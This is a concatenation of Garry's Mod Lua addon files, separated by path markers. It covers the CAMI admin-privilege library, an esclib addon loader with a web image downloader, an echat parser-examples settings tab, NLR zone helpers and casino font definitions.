--- @return string | nil @Optional reason
function CAMI_PRIVILEGE:HasAccess(actor, target)
end

--- Contains the registered CAMI_USERGROUP usergroup structures.
--- Indexed by usergroup name.
--- @type CAMI_USERGROUP[]
local usergroups = CAMI.GetUsergroups and CAMI.GetUsergroups() or {
    user = {
        Name = "user",
        Inherits = "user",
        CAMI_Source = "Garry's Mod",
    },
    admin = {
        Name = "admin",
        Inherits = "user",
        CAMI_Source = "Garry's Mod",
    },
    superadmin = {
        Name = "superadmin",
        Inherits = "admin",
        CAMI_Source = "Garry's Mod",
    }
}

--- Contains the registered CAMI_PRIVILEGE privilege structures.
--- Indexed by privilege name.
--- @type CAMI_PRIVILEGE[]
local privileges = CAMI.GetPrivileges and CAMI.GetPrivileges() or {}

--- Registers a usergroup with CAMI.
---
--- Use the source parameter to make sure CAMI.RegisterUsergroup function and
--- the CAMI.OnUsergroupRegistered hook don't cause an infinite loop
--- @param usergroup CAMI_USERGROUP @The structure for the usergroup you want to register
--- @param source any @Identifier for your own admin mod. Can be anything.
--- @return CAMI_USERGROUP @The usergroup given as an argument
function CAMI.RegisterUsergroup(usergroup, source)
    if source then
        usergroup.CAMI_Source = tostring(source)
    end
    usergroups[usergroup.Name] = usergroup

    hook.Call("CAMI.OnUsergroupRegistered", nil, usergroup, source)
    return usergroup
end

--- Unregisters a usergroup from CAMI. This will call a hook that will notify
--- all other admin mods of the removal.
---
--- ⚠ **Warning**: Call only when the usergroup is to be permanently removed.
---
--- Use the source parameter to make sure CAMI.UnregisterUsergroup function and
--- the CAMI.OnUsergroupUnregistered hook don't cause an infinite loop
--- @param usergroupName string @The name of the usergroup.
--- @param source any @Identifier for your own admin mod. Can be anything.
--- @return boolean @Whether the unregistering succeeded.
function CAMI.UnregisterUsergroup(usergroupName, source)
    if not usergroups[usergroupName] then return false end

    local usergroup = usergroups[usergroupName]
    usergroups[usergroupName] = nil

    hook.Call("CAMI.OnUsergroupUnregistered", nil, usergroup, source)

    return true
end

--- Retrieves all registered usergroups.
--- @return CAMI_USERGROUP[] @Usergroups indexed by their names.
function CAMI.GetUsergroups()
    return usergroups
end

--- Receives information about a usergroup.
--- @param usergroupName string
--- @return CAMI_USERGROUP | nil @Returns nil when the usergroup does not exist.
function CAMI.GetUsergroup(usergroupName)
    return usergroups[usergroupName]
end

--- Checks to see if potentialAncestor is an ancestor of usergroupName.
--- All usergroups are ancestors of themselves.
---
--- Examples:
--- * `user` is an ancestor of `admin` and also `superadmin`
--- * `admin` is an ancestor of `superadmin`, but not `user`
--- @param usergroupName string @The usergroup to query
--- @param potentialAncestor string @The ancestor to query
--- @return boolean @Whether usergroupName inherits potentialAncestor.
function CAMI.UsergroupInherits(usergroupName, potentialAncestor)
    repeat
        if usergroupName == potentialAncestor then return true end

        usergroupName = usergroups[usergroupName] and
                         usergroups[usergroupName].Inherits or
                         usergroupName
    until not usergroups[usergroupName] or
          usergroups[usergroupName].Inherits == usergroupName

    -- One can only be sure the usergroup inherits from user if the
    -- usergroup isn't registered.
    return usergroupName == potentialAncestor or potentialAncestor == "user"
end

--- Find the base group a usergroup inherits from.
---
--- This function traverses down the inheritence chain, so for example if you have
--- `user` -> `group1` -> `group2`
--- this function will return `user` if you pass it `group2`.
---
--- ℹ **NOTE**: All usergroups must eventually inherit either user, admin or superadmin.
--- @param usergroupName string @The name of the usergroup
--- @return "'user'" | "'admin'" | "'superadmin'" @The name of the root usergroup
function CAMI.InheritanceRoot(usergroupName)
    if not usergroups[usergroupName] then return end

    local inherits = usergroups[usergroupName].Inherits
    while inherits ~= usergroups[usergroupName].Inherits do
        usergroupName = usergroups[usergroupName].Inherits
    end

    return usergroupName
end

--- Registers an addon privilege with CAMI.
---
--- ⚠ **Warning**: This should only be used by addons. Admin mods must *NOT*
---  register their privileges using this function.
--- @param privilege CAMI_PRIVILEGE
--- @return CAMI_PRIVILEGE @The privilege given as argument.
function CAMI.RegisterPrivilege(privilege)
    privileges[privilege.Name] = privilege

    hook.Call("CAMI.OnPrivilegeRegistered", nil, privilege)

    return privilege
end

--- Unregisters a privilege from CAMI.
--- This will call a hook that will notify any admin mods of the removal.
---
--- ⚠ **Warning**: Call only when the privilege is to be permanently removed.
--- @param privilegeName string @The name of the privilege.
--- @return boolean @Whether the unregistering succeeded.
function CAMI.UnregisterPrivilege(privilegeName)
    if not privileges[privilegeName] then return false end

    local privilege = privileges[privilegeName]
    privileges[privilegeName] = nil

    hook.Call("CAMI.OnPrivilegeUnregistered", nil, privilege)

    return true
end

--- Retrieves all registered privileges.
--- @return CAMI_PRIVILEGE[] @All privileges indexed by their names.
function CAMI.GetPrivileges()
    return privileges
end

--- Receives information about a privilege.
--- @param privilegeName string
--- @return CAMI_PRIVILEGE | nil
function CAMI.GetPrivilege(privilegeName)
    return privileges[privilegeName]
end

-- Default access handler
local defaultAccessHandler = {["CAMI.PlayerHasAccess"] =
    function(_, actorPly, privilegeName, callback, targetPly, extraInfoTbl)
        -- The server always has access in the fallback
        if not IsValid(actorPly) then return callback(true, "Fallback.") end

        local priv = privileges[privilegeName]

        local fallback = extraInfoTbl and (
            not extraInfoTbl.Fallback and actorPly:IsAdmin() or
            extraInfoTbl.Fallback == "user" and true or
            extraInfoTbl.Fallback == "admin" and actorPly:IsAdmin() or
            extraInfoTbl.Fallback == "superadmin" and actorPly:IsSuperAdmin())


        if not priv then return callback(fallback, "Fallback.") end

        local hasAccess =
            priv.MinAccess == "user" or
            priv.MinAccess == "admin" and actorPly:IsAdmin() or
            priv.MinAccess == "superadmin" and actorPly:IsSuperAdmin()

        if hasAccess and priv.HasAccess then
            hasAccess = priv:HasAccess(actorPly, targetPly)
        end

        callback(hasAccess, "Fallback.")
    end,
    ["CAMI.SteamIDHasAccess"] =
    function(_, _, _, callback)
        callback(false, "No information available.")
    end
}

--- @class CAMI_ACCESS_EXTRA_INFO
--- @field Fallback "'user'" | "'admin'" | "'superadmin'" @Fallback status for if the privilege doesn't exist. Defaults to `admin`.
--- @field IgnoreImmunity boolean @Ignore any immunity mechanisms an admin mod might have.
--- @field CommandArguments table @Extra arguments that were given to the privilege command.

--- Checks if a player has access to a privilege
--- (and optionally can execute it on targetPly)
---
--- This function is designed to be asynchronous but will be invoked
---  synchronously if no callback is passed.
---
--- ⚠ **Warning**: If the currently installed admin mod does not support
---                 synchronous queries, this function will throw an error!
--- @param actorPly GPlayer @The player to query
--- @param privilegeName string @The privilege to query
--- @param callback fun(hasAccess: boolean, reason: string|nil) @Callback to receive the answer, or nil for synchronous
--- @param targetPly GPlayer | nil @Optional - target for if the privilege effects another player (eg kick/ban)
--- @param extraInfoTbl CAMI_ACCESS_EXTRA_INFO | nil @Table of extra information for the admin mod
--- @return boolean | nil @Synchronous only - if the player has the privilege
--- @return string | nil @Synchronous only - optional reason from admin mod
function CAMI.PlayerHasAccess(actorPly, privilegeName, callback, targetPly,
extraInfoTbl)
    local hasAccess, reason = nil, nil
    local callback_ = callback or function(hA, r) hasAccess, reason = hA, r end

    hook.Call("CAMI.PlayerHasAccess", defaultAccessHandler, actorPly,
        privilegeName, callback_, targetPly, extraInfoTbl)

    if callback ~= nil then return end

    if hasAccess == nil then
        local err = [[The function CAMI.PlayerHasAccess was used to find out
        whether Player %s has privilege "%s", but an admin mod did not give an
        immediate answer!]]
        error(string.format(err,
            actorPly:IsPlayer() and actorPly:Nick() or tostring(actorPly),
            privilegeName))
    end

    return hasAccess, reason
end

--- Get all the players on the server with a certain privilege
--- (and optionally who can execute it on targetPly)
---
--- ℹ **NOTE**: This is an asynchronous function!
--- @param privilegeName string @The privilege to query
--- @param callback fun(players: GPlayer[]) @Callback to receive the answer
--- @param targetPly GPlayer | nil @Optional - target for if the privilege effects another player (eg kick/ban)
--- @param extraInfoTbl CAMI_ACCESS_EXTRA_INFO | nil @Table of extra information for the admin mod
function CAMI.GetPlayersWithAccess(privilegeName, callback, targetPly,
extraInfoTbl)
    local allowedPlys = {}
    local allPlys = player.GetAll()
    local countdown = #allPlys

    local function onResult(ply, hasAccess, _)
        countdown = countdown - 1

        if hasAccess then table.insert(allowedPlys, ply) end
        if countdown == 0 then callback(allowedPlys) end
    end

    for _, ply in ipairs(allPlys) do
        CAMI.PlayerHasAccess(ply, privilegeName,
            function(...) onResult(ply, ...) end,
            targetPly, extraInfoTbl)
    end
end

--- @class CAMI_STEAM_ACCESS_EXTRA_INFO
--- @field IgnoreImmunity boolean @Ignore any immunity mechanisms an admin mod might have.
--- @field CommandArguments table @Extra arguments that were given to the privilege command.

--- Checks if a (potentially offline) SteamID has access to a privilege
--- (and optionally if they can execute it on a target SteamID)
---
--- ℹ **NOTE**: This is an asynchronous function!
--- @param actorSteam string | nil @The SteamID to query
--- @param privilegeName string @The privilege to query
--- @param callback fun(hasAccess: boolean, reason: string|nil) @Callback to receive  the answer
--- @param targetSteam string | nil @Optional - target SteamID for if the privilege effects another player (eg kick/ban)
--- @param extraInfoTbl CAMI_STEAM_ACCESS_EXTRA_INFO | nil @Table of extra information for the admin mod
function CAMI.SteamIDHasAccess(actorSteam, privilegeName, callback,
targetSteam, extraInfoTbl)
    hook.Call("CAMI.SteamIDHasAccess", defaultAccessHandler, actorSteam,
        privilegeName, callback, targetSteam, extraInfoTbl)
end

--- Signify that your admin mod has changed the usergroup of a player. This
--- function communicates to other admin mods what it thinks the usergroup
--- of a player should be.
---
--- Listen to the hook to receive the usergroup changes of other admin mods.
--- @param ply GPlayer @The player for which the usergroup is changed
--- @param old string @The previous usergroup of the player.
--- @param new string @The new usergroup of the player.
--- @param source any @Identifier for your own admin mod. Can be anything.
function CAMI.SignalUserGroupChanged(ply, old, new, source)
    hook.Call("CAMI.PlayerUsergroupChanged", nil, ply, old, new, source)
end

--- Signify that your admin mod has changed the usergroup of a disconnected
--- player. This communicates to other admin mods what it thinks the usergroup
--- of a player should be.
---
--- Listen to the hook to receive the usergroup changes of other admin mods.
--- @param steamId string @The steam ID of the player for which the usergroup is changed
--- @param old string @The previous usergroup of the player.
--- @param new string @The new usergroup of the player.
--- @param source any @Identifier for your own admin mod. Can be anything.
function CAMI.SignalSteamIDUserGroupChanged(steamId, old, new, source)
    hook.Call("CAMI.SteamIDUsergroupChanged", nil, steamId, old, new, source)
end
--PATH addons/____esclib/lua/elib/essentials/libs/esc_load_manager.lua:
local esclib = esclib
local server_clr = Color( 136, 221, 255 )
local client_clr = Color( 255, 221, 102, 255 )
local title_clr = Color(88, 209, 187)

esclib.loader = esclib.loader or {}
esclib.loader.addons = esclib.loader.addons or {}


---------------------------
--# MATERIAL DOWNLOADER #--
---------------------------
--thanks to https://github.com/Be1zebub/Small-GLua-Things/blob/master/sh_material_downloader.lua

local file, Material, Fetch, find = file, Material, http.Fetch, string.find

if CLIENT then
	local DOWNLOAD_PATH = "esclib_download"
	local errorMat = Material("error")
	esclib.WebImageCache = esclib.WebImageCache or {}
	function esclib:DownloadMaterial(url, file_path, file_name, on_succ, on_err, retry_count)
		if not url then return end

		if esclib.WebImageCache[url] then 
			print("[esclib][MaterialDownloader] - Using chached material")
			if esclib.WebImageCache[url]:IsError() then
				on_err("Material isn't loaded properly. Maybe broken?")
				return false
			end
			on_succ(esclib.WebImageCache[url])
			return true
		end

		local folder = DOWNLOAD_PATH .. "/" .. file_path
		local path = folder .. "/" .. file_name
		esclib.file:MakeDirectoriesIfNotExists(folder)
		local data_path = "data/" .. path
		
		if file.Exists(path, "DATA") then
			print("[esclib][MaterialDownloader] - Material already exists. Using it")
			esclib.WebImageCache[url] = Material(data_path, "smooth")
			on_succ(esclib.WebImageCache[url])
		else
			Fetch(url, function(img)
				if img == nil or find(string.lower(img), "<!doctype html>", 1, true) then 
					print("[esclib][MaterialDownloader] - FAILED TO DOWNLOAD MATERIAL. URL: "..url)
					on_err("Bad url or not found image on it. Maybe link isn't direct?")
					return
				end

				file.Write(path, img)
				esclib.WebImageCache[url] = Material(data_path, "smooth")
				if esclib.WebImageCache[url]:IsError() then
					on_err("Downloaded material is broken.")
					print("[esclib][MaterialDownloader] Deleting bad downloaded file")
					file.Delete(path)
					return false
				end
				on_succ(esclib.WebImageCache[url])
			end, function(errMsg)
				if retry_count and retry_count > 0 then
					retry_count = retry_count - 1
					esclib:DownloadMaterial(url, path, on_succ, retry_count)
				else
					errMsg = errMsg or ""
					print("[esclib][MaterialDownloader] - BAD URL / PROBLEMS WITH INTERNET. URL: "..url.. " Response data: "..errMsg)
					on_err("Failed to download - "..errMsg)
				end
			end)
		end
	end

	function esclib:ClearDownloadCache(path)
		path = path or ""
		if path ~= "" then path = "/"..path end
		self.file:RemoveFolder(DOWNLOAD_PATH..path)
		table.Empty(esclib.WebImageCache)
	end

	concommand.Add("esclib_clear_cache", function()
		esclib:ClearDownloadCache()
	end)
end

--example
-- esclib:DownloadMaterial("https://i.imgur.com/Msmeqkq.png", "echat", "mat.png", function(mat)
--     local w, h = 128, 128
-- 	print(mat)
-- end)


local LOADER_META = {}
LOADER_META.__index = LOADER_META
function LOADER_META:Print(...)
	MsgC(Color(13, 255, 51), "[•] ", color_white, unpack({...}))
	MsgC("\n")
	-- print(msg)
end

function LOADER_META:Client(path)
	if (CLIENT) then include(self.dpath .. path) end
	if (SERVER) then
		self:Print(client_clr, "[CL] ", color_white, self.dpath..path)
		AddCSLuaFile(self.dpath .. path)
	end
end

function LOADER_META:ClientFolder(name,recurse)
	local files, folders = file.Find(self.dpath .. name .. "/*", "LUA")
	for k, fname in ipairs(files) do
		self:Client(name.."/"..fname)
	end
	if recurse then
		for _, fname in ipairs(folders) do
            self:ClientFolder(name .."/".. fname, recurse)
        end
    end
end

function LOADER_META:Server(path)
	if (SERVER) then
		self:Print(server_clr, "[SV] ", color_white, self.dpath..path)
		include(self.dpath .. path)
	end
end

function LOADER_META:ServerFolder(name,recurse)
	local files, folders = file.Find(self.dpath .. name .. "/*", "LUA")
	for k, fname in ipairs(files) do
		self:Server(name.."/"..fname)
	end
	if recurse then
		for _, fname in ipairs(folders) do
            self:ServerFolder(name .."/".. fname, recurse)
        end
    end
end

function LOADER_META:Shared(path)
	self:Client(path)
	self:Server(path)
end

function LOADER_META:SharedFolder(name,recurse)
	local files, folders = file.Find(self.dpath .. name .. "/*", "LUA")
	for k, fname in ipairs(files) do
		self:Shared(name.."/"..fname)
	end
	if recurse then
		for _, fname in ipairs(folders) do
            self:SharedFolder(name .."/".. fname, recurse)
        end
    end
end

function LOADER_META:Resource(fullpath)
	if (SERVER) then
		self:Print(server_clr, "[Resource] ", color_white, fullpath)
		-- resource.AddFile(fullpath)
	end
end

function LOADER_META:ResourceFolder(fullpath, recurse)
    local files, folders = file.Find(fullpath .."/*", "GAME")

    for _, fname in ipairs(files) do
        self:Resource(fullpath .."/".. fname)
    end

    if recurse then
        for _, fname in ipairs(folders) do
            self:ResourceFolder(fullpath .."/".. fname, recurse)
        end
    end
end

function LOADER_META:Material(fullpath, name, download)
	if (SERVER) and (download) then
		--add to load
		self:Print(server_clr, "[Material] ", color_white, fullpath)
		-- resource.AddFile(fullpath)
	end

	--yes on sv too
	local mat = Material(fullpath,"smooth")
	if name then
		self.Materials[name] = mat
	else
		table.insert(self.Materials, mat)
	end
	return mat
end

function LOADER_META:GetMaterials()
	return self.Materials or {}
end

function LOADER_META:MaterialFolder(fullpath, recurse, download)
    local files, folders = file.Find(fullpath .."/*", "GAME")

    for _, fname in ipairs(files) do
        self:Material(fullpath .."/".. fname, fname, download)
    end

    if recurse then
        for _, fname in ipairs(folders) do
            self:MaterialFolder(fullpath .."/".. fname, recurse, download)
        end
    end
end

function LOADER_META:MaterialUrl(name, url)
	if (CLIENT) then
		self:Print("Downloading material: ( ".. self.dpath .. name.." ) Retries: 2")
		esclib:DownloadMaterial(url, self.dpath, name, function(mat)

			if IsValid(mat) then
				self.Materials[name] = mat
				self:Print("Downloading succesuful")
			else
				self:Print("Downloading failed...")
			end
		end) --after 2 retries stop
	end
end




function esclib.loader:New(uid,path,callback)
	if not uid then return end
	if not path then return end
	if not callback then
		callback = path
		path = ""
	end
	if not isfunction(callback) then return end

	-- if already exists:
	if self.addons[uid] then 
		self.addons[uid]["Materials"] = {}
		self.addons[uid]["dpath"] = path
		self.addons[uid]["Load"] = function(add)
			add.finished = false
			callback(add)
			add.finished = true
		end

		setmetatable(self.addons[uid], LOADER_META)
		-- self.addons[uid]:Load()
		return
	end

	--else
	self.addons[uid] = {}
	self.addons[uid]["Materials"] = {}
	self.addons[uid]["dpath"] = path
	self.addons[uid]["Load"] = function(add)
		add.finished = false
		callback(add)
		add.finished = true
	end

	setmetatable(self.addons[uid], LOADER_META)
	-- self.addons[uid]:Load()
end

function esclib.loader:LoadAllAddons()
	for uid,addon in pairs(self.addons) do
		if (SERVER) then MsgC(title_clr, "\n["..(uid).."] Loading started...\n") end
		addon:Load()
		if (SERVER) then MsgC(title_clr, "["..(uid).."] Loading finished!\n") end
	end
end

function esclib.loader:IsLoaded(addon_name)
	if esclib.loader.addons[addon_name] then
		return esclib.loader.addons[addon_name].finished
	end
end

-- esclib.loader:New("ehud","ehud/",function(load)
-- 	-- PrintTable(loader)
-- 	load:Client("config/ehud_config.lua")
-- end)

-- esclib.loader:LoadAllAddons()
--PATH addons/____echat/lua/echat/core/modules/parser_examples.lua:
if CLIENT then

	echat.addon:AddSettingsTab("parsers_examples", "realm_Client", 10, function(addon, settab, combolist, callback)
	local clr = esclib.addon:GetColors()
	combolist:AddTab( echat.addon:Translate("s_tab_parser_examples"), function(tab_content)

		local scroll = tab_content:Add("esclib.scrollpanel")
		scroll:SetScrollSpeed(15)
		
		local parsers = echat:GetParsers()

		local pnl = scroll:Add("DIconLayout")
		pnl:SetSize(tab_content:GetWide(),tab_content:GetTall())
		local w,h = pnl:GetWide(), pnl:GetTall()

		pnl:SetBorder(w*0.01)
		w = w - pnl:GetBorder()*2

		pnl:SetSpaceY(h*0.02)

		scroll:SetSize(tab_content:GetWide(),tab_content:GetTall()-pnl:GetBorder())

		for name,parser in pairs(parsers) do
			local example = parser.example or parser.uid
			if istable(example) and table.IsSequential(example) then
				example = example[1] or parser.uid
			end
			example = "<"..example.."> Hello world!"

			local parser_pnl = pnl:Add("DPanel")
			function parser_pnl:Paint(w,h)
				draw.RoundedBox(16,0,0,w,h, clr.frame.accent)
				draw.RoundedBox(14,2,2,w-4,h-4, clr.frame.bg)
			end

			local richtext = parser_pnl:Add("echat.richtext")
			richtext:Dock(FILL)
			local mx, my, mw, mh = w*0.015,h*0.03,w*0.015,h*0.03
			richtext:DockMargin(mx,my,mw,mh)

			richtext:SetW(pnl:GetWide())
			richtext:SetHeight(parser_pnl:GetTall())
			richtext:SetVerticalScrollbarEnabled(false)
			richtext:SetMouseInputEnabled(false)

			richtext:InsertColorChange(clr.button.apply.r, clr.button.apply.g, clr.button.apply.b)
			richtext:InsertFontChange(echat:AdaptiveMonoFont("echatmono", 30, 500)) --no need to be adapted
			richtext:AppendText(parser.uid.."\n")

			richtext:InsertFontChange(echat:AdaptiveFont("echat", 16, 500))
			richtext:InsertColorChange(clr.frame.text_gray.r, clr.frame.text_gray.g, clr.frame.text_gray.b)
			richtext:AppendText(parser.description)

			richtext:AppendEmptyLine(12)

			richtext:InsertColorChange(clr.frame.text.r, clr.frame.text.g, clr.frame.text.b)
			richtext:InsertFontChange(echat:AdaptiveFont("echat", 20, 500))
			richtext:AppendText(example)
			richtext:InsertColorChange(clr.button.apply.r, clr.button.apply.g, clr.button.apply.b)
			richtext:AppendText(" -> ")
			richtext:InsertColorChange(clr.frame.text.r, clr.frame.text.g, clr.frame.text.b)
			echat:ConvertParsedToRichtext(richtext, echat:ParseText(example.." "))

			local tall = richtext:GetCanvas():CalculateMaxTall()+my+mh
			parser_pnl:SetSize(w, tall)
		end

		

		return scroll
	end)
end)

end
--PATH addons/__________scripts__loader/lua/scriptssss/nlr/sh_nlr.lua:
onyx.netvar:Register( 'NLR', {
    type = TYPE_TABLE,
    public = false
} )

local PLAYER = FindMetaTable('Player')
function PLAYER:InNLRZone()
	if self:Alive() and self:GetNetVar('NLR', {}) ~= {} then
		return (self:GetNetVar('NLR').Pos:DistToSqr(self:GetPos()) < 122500)
	end
	return false
end

function PLAYER:GetNLRTime()
	if self:Alive() and self:GetNetVar('NLR', {}) ~= {} then
		return math.Round(self:GetNetVar('NLR').Time - CurTime(), 0)
	end
end
--PATH addons/_pcasino/lua/perfectcasino/derma/cl_fonts.lua:
-- This just creates the font. to keep them organised
surface.CreateFont("pCasino.Header.Static", {
	font = "Roboto",
	size = 35,
})
surface.CreateFont("pCasino.Title.Static", {
	font = "Roboto",
	size = 36,
})
surface.CreateFont("pCasino.Entity.Bid", {
	font = "Roboto",
	size = 40,
})
surface.CreateFont("pCasino.Entity.Arrows", {
	font = "Roboto",
	size = 60,
})
surface.CreateFont("pCasino.SubTitle.Static", {
	font = "Roboto",
	size = 24,
})
surface.CreateFont("pCasino.Main.Static", {
	font = "Roboto",
	size = 28,
})
surface.CreateFont("pCasino.Nav.Static", {
	font = "Roboto",
	size = 25,
})
surface.CreateFont("pCasino.Textbox.Static", {
	font = "Roboto",
	size = 20,
	weight = 500,
})
surface.CreateFont("pCasino.Button.Micro", {
	font = "Roboto",
	size = 15,
	weight = 500,
})